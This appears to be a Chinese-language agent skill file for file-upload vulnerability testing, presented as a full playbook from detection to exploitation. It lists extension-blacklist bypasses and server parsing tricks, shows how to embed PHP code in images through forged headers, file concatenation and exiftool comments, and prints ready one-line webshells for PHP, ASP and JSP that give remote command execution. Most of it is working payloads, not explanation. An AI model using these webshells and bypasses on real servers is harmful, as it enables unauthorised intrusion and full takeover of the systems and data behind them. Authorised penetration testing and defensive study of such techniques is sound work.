---
name: file-upload-testing
description: 文件上传漏洞测试，覆盖检测→后缀绕过→内容绕过→条件竞争→云存储利用→WebShell写入全流程
---

# 文件上传漏洞测试

## 概述

文件上传是获取WebShell的最直接途径。本技能覆盖从检测到利用的完整方法。

## 1. 上传点检测

```
常见上传点:
- 头像上传 / 文件共享 / 文档管理 / 导入功能
- API文件上传接口 / 富文本编辑器图片上传
- 插件/主题上传 (WordPress等)
```

## 2. 后缀名绕过

### 2.1 黑名单绕过

```bash
# PHP可执行后缀
.php .php3 .php4 .php5 .php7 .phtml .pht .phar .phps .shtml
# ASP/ASPX
.asp .aspx .asa .cer .cdx .ashx .asmx .ascx
# JSP
.jsp .jspx .jspf .jsw .jsv
# 其他
.php. .php.jpg .php;.jpg .php%00.jpg .php.jpg (双重扩展名)
.PHP (大小写) .Php .pHp
```

### 2.2 解析漏洞利用

```
Apache:  .php.xxx → 从右向左找未知扩展名, 找到.php执行
IIS 6:   /xxx.asp/ → 目录名为.asp, 目录下所有文件当ASP执行
         xx.asp;.jpg → 分号截断
IIS 7.5: xx.jpg/xx.php → 条件put+move
Nginx:   xx.jpg%00.php → 00截断(旧版)
         xx.jpg/.php → 配置错误
```

## 3. 内容验证绕过

### 3.1 文件头伪造

```bash
# 在PHP代码前加图片文件头
GIF89a <?php @eval($_POST[1]);?>
\x89PNG <?php @eval($_POST[1]);?>
```

### 3.2 getimagesize() 绕过

```bash
# 生成带PHP代码的合法图片
# 方法1: 在真实图片末尾追加PHP代码
copy /b original.jpg + shell.php payload.jpg

# 方法2: exiftool注入
exiftool -Comment='<?php @eval($_POST[1]);?>' image.jpg

# 方法3: 图片马 + 文件包含组合利用
# 上传图片马 → LFI包含 → 代码执行
```

## 4. 条件竞争

```bash
# 目标: 文件先上传到临时目录, 再检查+移动
# 在检查窗口期访问临时文件

# Turbo Intruder脚本 (race条件):
# 同时发送: 上传请求 + 访问临时路径请求
```

## 5. 写WebShell

```php
# === PHP一句话 ===
<?php @eval($_POST[1]);?>
<?=system($_GET['cmd'])?>
<?=`$_GET[1]`?>

# === ASP一句话 ===
<%eval request("1")%>

# === JSP一句话 ===
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

## 6. 绕过CDN/云存储

```bash
# AWS S3 → 上传公开读文件
# 阿里云OSS → 上传跨域XML
# SSRF → 上传到内网
```

---

*参考: OWASP File Upload + 实战经验整理*
